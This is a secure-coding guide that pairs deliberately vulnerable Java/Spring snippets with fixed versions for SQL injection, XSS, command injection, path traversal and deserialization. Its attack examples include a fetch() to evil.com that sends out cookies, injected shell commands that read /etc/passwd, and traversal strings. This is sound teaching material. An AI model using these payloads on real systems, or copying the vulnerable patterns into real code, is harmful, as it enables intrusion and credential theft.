# 🔐 Security Comparison: Vulnerable vs Secured Code

This document provides a side-by-side comparison of vulnerable code patterns and their secure alternatives.

---

## 1️⃣ SQL Injection

### ❌ VULNERABLE CODE
```java
// VulnerableService.java - Line 45-60
public List<User> searchUserVulnerable(String username) throws SQLException {
    // DANGEROUS: String concatenation in SQL query
    String sql = "SELECT * FROM users WHERE username LIKE '%" + username + "%'";

    Statement stmt = conn.createStatement();
    ResultSet rs = stmt.executeQuery(sql);  // User input becomes part of SQL!
    // ...
}
```

**Attack Payload:**
```
username = ' OR '1'='1' --
```

**Resulting Query:**
```sql
SELECT * FROM users WHERE username LIKE '%' OR '1'='1' --%'
-- Returns ALL users including passwords, credit cards, SSN!
```

### ✅ SECURED CODE
```java
// SecuredService.java - Line 50-65
public List<User> searchUserSecured(String username) {
    // SAFE: Parameterized query with placeholder
    String sql = "SELECT id, username, email, role FROM users WHERE username LIKE ?";

    return jdbcTemplate.query(
        sql,
        new Object[]{"%" + username + "%"},  // Parameter binding - treated as DATA
        (rs, rowNum) -> {
            User user = new User();
            user.setId(rs.getInt("id"));
            user.setUsername(rs.getString("username"));
            user.setEmail(rs.getString("email"));
            user.setRole(rs.getString("role"));
            // NEVER return: password, credit_card, ssn
            return user;
        }
    );
}
```

**Key Fixes:**
1. ✅ Use `PreparedStatement` with `?` placeholders
2. ✅ Parameter binding (input is always treated as data)
3. ✅ Only select necessary columns (no sensitive data)
4. ✅ Input validation before query

---

## 2️⃣ Cross-Site Scripting (XSS)

### ❌ VULNERABLE CODE
```java
// VulnerableController.java
@PostMapping("/api/comments")
public ResponseEntity<?> addComment(@RequestParam String comment) {
    response.put("comment", comment);  // Stored as-is
    return ResponseEntity.ok(response);
}
```

```html
<!-- comments.html - VULNERABLE -->
<div class="comment-content" th:utext="${comment.content}">Content</div>
<!-- th:utext = unescaped text = XSS! -->
```

**Attack Payload:**
```html
<script>alert(document.cookie)</script>
<img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">
```

### ✅ SECURED CODE
```java
// SecuredController.java
@PostMapping("/api/comments")
public ResponseEntity<?> addCommentSecured(@RequestParam String comment) {
    // Validate input length
    if (comment == null || comment.length() > 1000) {
        return ResponseEntity.badRequest().body(Map.of("error", "Comment too long"));
    }

    // HTML encode to prevent XSS
    String safeComment = HtmlUtils.htmlEscape(comment);

    response.put("comment", safeComment);  // Stored safely
    return ResponseEntity.ok(response);
}
```

```html
<!-- secured/comments.html - SAFE -->
<div class="comment-content" th:text="${comment.content}">Content</div>
<!-- th:text = escaped text = SAFE -->
```

**Key Fixes:**
1. ✅ Server-side HTML encoding with `HtmlUtils.htmlEscape()`
2. ✅ Use `th:text` instead of `th:utext` in Thymeleaf
3. ✅ Input length validation
4. ✅ Content Security Policy (CSP) headers (bonus)

---

## 3️⃣ Command Injection

### ❌ VULNERABLE CODE
```java
// VulnerableController.java
@GetMapping("/api/ping")
public ResponseEntity<?> pingHost(@RequestParam String host) {
    // DANGEROUS: User input concatenated into shell command
    String command = "ping -c 1 " + host;

    Process process = Runtime.getRuntime().exec(command);  // Shell interprets entire string!
    // ...
}
```

**Attack Payload:**
```
host = 127.0.0.1; cat /etc/passwd
host = 127.0.0.1 && whoami
host = `id`
```

**Resulting Command:**
```bash
ping -c 1 127.0.0.1; cat /etc/passwd
# Executes TWO commands!
```

### ✅ SECURED CODE
```java
// SecuredController.java
private static final Pattern VALID_HOST_PATTERN =
    Pattern.compile("^[a-zA-Z0-9]([a-zA-Z0-9\\-]{0,61}[a-zA-Z0-9])?(\\.[a-zA-Z0-9]([a-zA-Z0-9\\-]{0,61}[a-zA-Z0-9])?)*$");

@GetMapping("/api/ping")
public ResponseEntity<?> pingHostSecured(@RequestParam String host) {
    // VALIDATE: Whitelist pattern check
    if (!VALID_HOST_PATTERN.matcher(host).matches()) {
        return ResponseEntity.badRequest().body(Map.of("error", "Invalid hostname"));
    }

    // SAFE: ProcessBuilder with argument array
    ProcessBuilder processBuilder = new ProcessBuilder("ping", "-c", "1", host);
    // Each argument is passed separately - no shell interpretation!

    processBuilder.redirectErrorStream(true);
    Process process = processBuilder.start();
    // ...
}
```

**Key Fixes:**
1. ✅ Input validation with whitelist regex pattern
2. ✅ Use `ProcessBuilder` with argument array (not string concatenation)
3. ✅ Avoid `Runtime.exec(String)` - use `ProcessBuilder` or `exec(String[])`
4. ✅ Timeout handling to prevent DoS

---

## 4️⃣ Path Traversal

### ❌ VULNERABLE CODE
```java
// VulnerableController.java
@GetMapping("/api/files")
public ResponseEntity<?> readFile(@RequestParam String filename) {
    // DANGEROUS: No path validation
    String basePath = System.getProperty("user.dir") + "/uploads/";
    String filePath = basePath + filename;  // User input directly appended!

    String content = new String(Files.readAllBytes(Paths.get(filePath)));
    // ...
}
```

**Attack Payload:**
```
filename = ../../../../../etc/passwd
filename = ..\..\..\..\Windows\win.ini
filename = ....//....//....//etc/passwd
```

**Resulting Path:**
```
/app/uploads/../../../../../etc/passwd
→ Resolves to: /etc/passwd
```

### ✅ SECURED CODE
```java
// SecuredController.java
private static final Pattern VALID_FILENAME_PATTERN =
    Pattern.compile("^[a-zA-Z0-9_\\-]+\\.[a-zA-Z0-9]+$");

@GetMapping("/api/files")
public ResponseEntity<?> readFileSecured(@RequestParam String filename) {
    // VALIDATE 1: Whitelist pattern
    if (!VALID_FILENAME_PATTERN.matcher(filename).matches()) {
        return ResponseEntity.badRequest().body(Map.of("error", "Invalid filename"));
    }

    // VALIDATE 2: No path traversal characters
    if (filename.contains("..") || filename.contains("/") || filename.contains("\\")) {
        return ResponseEntity.badRequest().body(Map.of("error", "Path traversal detected"));
    }

    // SAFE: Canonicalize and verify path
    Path baseDir = Paths.get(System.getProperty("user.dir"), "uploads")
        .toAbsolutePath()
        .normalize();

    Path requestedFile = baseDir.resolve(filename)
        .toAbsolutePath()
        .normalize();

    // VALIDATE 3: Must be within base directory
    if (!requestedFile.startsWith(baseDir)) {
        return ResponseEntity.badRequest().body(Map.of("error", "Access denied"));
    }

    // VALIDATE 4: File must exist and be regular file
    if (!Files.exists(requestedFile) || !Files.isRegularFile(requestedFile)) {
        return ResponseEntity.badRequest().body(Map.of("error", "File not found"));
    }

    String content = Files.readString(requestedFile);
    // ...
}
```

**Key Fixes:**
1. ✅ Whitelist validation for filename characters
2. ✅ Reject path traversal sequences (`..`, `/`, `\`)
3. ✅ Canonicalize paths with `toAbsolutePath().normalize()`
4. ✅ Verify resolved path starts with base directory
5. ✅ File existence and type checks

---

## 5️⃣ Insecure Deserialization

### ❌ VULNERABLE CODE
```java
// VulnerableController.java
@PostMapping("/api/deserialize")
public ResponseEntity<?> deserializeObject(@RequestBody byte[] data) {
    // DANGEROUS: Deserializing untrusted binary data
    ByteArrayInputStream bis = new ByteArrayInputStream(data);
    ObjectInputStream ois = new ObjectInputStream(bis);
    Object obj = ois.readObject();  // Can execute arbitrary code!
    // ...
}
```

**Attack:**
An attacker can craft a malicious serialized object using tools like `ysoserial` that executes arbitrary code when deserialized.

### ✅ SECURED CODE
```java
// SecuredController.java
@PostMapping("/api/deserialize")
public ResponseEntity<?> deserializeSecured(@RequestBody String jsonData) {
    // SAFE: Use JSON instead of Java serialization
    Gson gson = new Gson();

    // Only allow specific DTO types
    Map<String, Object> data = gson.fromJson(jsonData, Map.class);

    // Validate expected fields
    if (data == null || !data.containsKey("type")) {
        return ResponseEntity.badRequest().body(Map.of("error", "Invalid JSON"));
    }

    // Process validated data...
}
```

**Key Fixes:**
1. ✅ Never deserialize untrusted binary data
2. ✅ Use JSON/XML instead of Java serialization
3. ✅ If serialization needed, use whitelist with `ObjectInputFilter`
4. ✅ Validate all input fields after parsing

---

## 📊 Summary Table

| Vulnerability | Vulnerable Pattern | Secure Pattern |
|--------------|-------------------|----------------|
| SQL Injection | String concatenation in SQL | Parameterized queries |
| XSS | `th:utext`, no encoding | `th:text`, `HtmlUtils.htmlEscape()` |
| Command Injection | `Runtime.exec(string)` | `ProcessBuilder` + validation |
| Path Traversal | Direct path concatenation | Canonicalization + boundary check |
| Deserialization | `ObjectInputStream` on untrusted data | JSON + validation |

---

## 🛡️ Defense in Depth Checklist

- [ ] Input validation (whitelist > blacklist)
- [ ] Output encoding (context-aware)
- [ ] Parameterized queries (never concatenate)
- [ ] Principle of least privilege
- [ ] Error handling (don't leak info)
- [ ] Security headers (CSP, X-Frame-Options, etc.)
- [ ] Logging and monitoring
- [ ] Regular security testing
